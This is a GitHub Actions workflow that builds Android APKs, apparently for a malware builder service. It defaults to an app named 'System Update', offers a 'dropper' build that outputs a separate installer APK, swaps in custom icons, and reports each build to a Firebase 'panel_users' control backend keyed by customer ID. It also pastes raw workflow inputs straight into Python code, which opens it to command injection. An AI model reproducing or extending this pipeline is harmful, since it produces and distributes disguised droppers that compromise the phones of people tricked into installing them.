name: Android APK Builder

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'App Name'
        required: true
        default: 'System Update'
      package_name:
        description: 'Package Name'
        required: true
        default: 'com.system.service.booster'
      webview_url:
        description: 'Webview URL'
        required: false
        default: 'https://calculator.apps.chrome'
      user_id:
        description: 'User UID'
        required: true
        default: 'master01'
      build_type:
        description: 'Build Type (main or dropper)'
        required: true
        default: 'main'
      app_icon_b64:
        description: 'Base64 encoded App Icon PNG'
        required: false
        default: ''

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: read

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      - name: Install Python Pillow
        run: python -m pip install pillow requests

      - name: Grant Execute Permission for Gradlew
        run: chmod +x gradlew

      - name: Inject Configuration & Custom Icon
        run: |
          python -c "
          import os, re, base64
          from PIL import Image

          app_name = '${{ github.event.inputs.app_name }}'
          package_name = '${{ github.event.inputs.package_name }}'
          webview_url = '${{ github.event.inputs.webview_url }}'
          user_id = '${{ github.event.inputs.user_id }}'
          icon_b64 = '${{ github.event.inputs.app_icon_b64 }}'
          firebase_url = 'https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/'

          # 1. Update AndroidManifest.xml
          manifest = 'app/src/main/AndroidManifest.xml'
          if os.path.exists(manifest):
              with open(manifest, 'r', encoding='utf-8') as f:
                  c = f.read()
              c = re.sub(r'android:name=\"webview_url\" android:value=\"[^\"]*\"', f'android:name=\"webview_url\" android:value=\"{webview_url}\"', c)
              c = re.sub(r'android:name=\"user_id\" android:value=\"[^\"]*\"', f'android:name=\"user_id\" android:value=\"{user_id}\"', c)
              c = re.sub(r'android:name=\"firebase_url\" android:value=\"[^\"]*\"', f'android:name=\"firebase_url\" android:value=\"{firebase_url}\"', c)
              with open(manifest, 'w', encoding='utf-8') as f:
                  f.write(c)

          # 2. Update strings.xml (Main App)
          strings = 'app/src/main/res/values/strings.xml'
          if os.path.exists(strings):
              with open(strings, 'r', encoding='utf-8') as f:
                  c = f.read()
              c = re.sub(r'<string name=\"app_name\">.*</string>', f'<string name=\"app_name\">{app_name}</string>', c)
              with open(strings, 'w', encoding='utf-8') as f:
                  f.write(c)

          # 3. Update strings.xml (Dropper App)
          dropper_strings = 'dropper/src/main/res/values/strings.xml'
          os.makedirs(os.path.dirname(dropper_strings), exist_ok=True)
          with open(dropper_strings, 'w', encoding='utf-8') as f:
              f.write(f'<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <string name=\"app_name\">{app_name}</string>\n</resources>')

          dropper_manifest = 'dropper/src/main/AndroidManifest.xml'
          if os.path.exists(dropper_manifest):
              with open(dropper_manifest, 'r', encoding='utf-8') as f:
                  c = f.read()
              c = re.sub(r'android:label=\"[^\"]*\"', 'android:label=\"@string/app_name\"', c)
              with open(dropper_manifest, 'w', encoding='utf-8') as f:
                  f.write(c)

          # 4. Update package name in build.gradle.kts
          app_gradle = 'app/build.gradle.kts'
          if os.path.exists(app_gradle):
              with open(app_gradle, 'r', encoding='utf-8') as f:
                  c = f.read()
              c = re.sub(r'applicationId\s*=\s*\"[^\"]*\"', f'applicationId = \"{package_name}\"', c)
              with open(app_gradle, 'w', encoding='utf-8') as f:
                  f.write(c)

          dropper_gradle = 'dropper/build.gradle.kts'
          if os.path.exists(dropper_gradle):
              with open(dropper_gradle, 'r', encoding='utf-8') as f:
                  c = f.read()
              c = re.sub(r'applicationId\s*=\s*\"[^\"]*\"', f'applicationId = \"{package_name}.installer\"', c)
              with open(dropper_gradle, 'w', encoding='utf-8') as f:
                  f.write(c)

          # 5. Update google-services.json
          gs = 'app/google-services.json'
          if os.path.exists(gs):
              with open(gs, 'r', encoding='utf-8') as f:
                  c = f.read()
              c = re.sub(r'\"package_name\":\s*\"[^\"]*\"', f'\"package_name\": \"{package_name}\"', c)
              with open(gs, 'w', encoding='utf-8') as f:
                  f.write(c)

          # 6. Process Custom Icon PNG if provided
          if icon_b64 and len(icon_b64) > 10:
              try:
                  icon_path = 'temp_icon.png'
                  with open(icon_path, 'wb') as f:
                      f.write(base64.b64decode(icon_b64))
                  img = Image.open(icon_path)
                  sizes = {'mdpi': 48, 'hdpi': 72, 'xhdpi': 96, 'xxhdpi': 144, 'xxxhdpi': 192}
                  for target_dir in ['app/src/main/res', 'dropper/src/main/res']:
                      for density, size in sizes.items():
                          out_dir = os.path.join(target_dir, f'mipmap-{density}')
                          os.makedirs(out_dir, exist_ok=True)
                          img.resize((size, size)).save(os.path.join(out_dir, 'ic_launcher.png'))
                          img.resize((size, size)).save(os.path.join(out_dir, 'ic_launcher_round.png'))
                  print('Custom icon processed successfully!')
              except Exception as e:
                  print(f'Icon decode error: {e}')
          "

      - name: Build Main APK
        if: ${{ github.event.inputs.build_type != 'dropper' }}
        run: ./gradlew assembleDebug --no-daemon

      - name: Build Dropper APK
        if: ${{ github.event.inputs.build_type == 'dropper' }}
        run: ./gradlew :dropper:assembleDebug --no-daemon

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ github.event.inputs.app_name }}_${{ github.event.inputs.user_id }}-APK
          path: |
            app/build/outputs/apk/debug/*.apk
            dropper/build/outputs/apk/debug/*.apk

      - name: Upload APK to GitHub Release (Optional Direct Download Link)
        if: ${{ job.status == 'success' }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python -c "
          import os, subprocess, re

          user_id = '${{ github.event.inputs.user_id }}'
          app_name = '${{ github.event.inputs.app_name }}'
          is_dropper = '${{ github.event.inputs.build_type }}' == 'dropper'

          clean_name = re.sub(r'[^\w._\- ]', '', app_name).strip().replace(' ', '_') or 'App'
          suffix = '_dropper' if is_dropper else ''
          target_fname = f'{clean_name}_{user_id}{suffix}.apk'

          if is_dropper:
              src_apk = 'dropper/build/outputs/apk/debug/dropper-debug.apk'
          else:
              src_apk = 'app/build/outputs/apk/debug/app-debug.apk'

          if os.path.exists(src_apk):
              os.rename(src_apk, target_fname)
              print(f'Renamed {src_apk} -> {target_fname}')
              try:
                  subprocess.run(['gh', 'release', 'create', 'v1.0', '--title', 'Releases', '--notes', 'Automated APK Builds', '--clobber'], check=False)
                  subprocess.run(['gh', 'release', 'upload', 'v1.0', target_fname, '--clobber'], check=False)
                  print(f'Uploaded {target_fname} to Release v1.0 successfully!')
              except Exception as err:
                  print(f'Release upload notice (non-fatal): {err}')
          "

      - name: Notify Firebase Status Complete
        if: always()
        run: |
          python -c "
          import requests, json, re

          user_id = '${{ github.event.inputs.user_id }}'
          app_name = '${{ github.event.inputs.app_name }}'
          is_dropper = '${{ github.event.inputs.build_type }}' == 'dropper'
          status = '${{ job.status }}'
          fb_url = 'https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app'

          clean_name = re.sub(r'[^\w._\- ]', '', app_name).strip().replace(' ', '_') or 'App'
          suffix = '_dropper' if is_dropper else ''
          fname = f'{clean_name}_{user_id}{suffix}.apk'
          artifact_name = f'{app_name}_{user_id}-APK'

          if status == 'success':
              requests.patch(f'{fb_url}/panel_users/{user_id}/build_status.json', json={
                  'status': '✅ Complete',
                  'percent': 100,
                  'last_log': 'Cloud build finished & ready for download!'
              })
              requests.patch(f'{fb_url}/panel_users/{user_id}.json', json={
                  'last_apk': fname,
                  'last_artifact_name': artifact_name
              })
          else:
              requests.patch(f'{fb_url}/panel_users/{user_id}/build_status.json', json={
                  'status': '❌ Build Failed',
                  'percent': 0,
                  'last_log': 'GitHub Actions build failed'
              })
          "
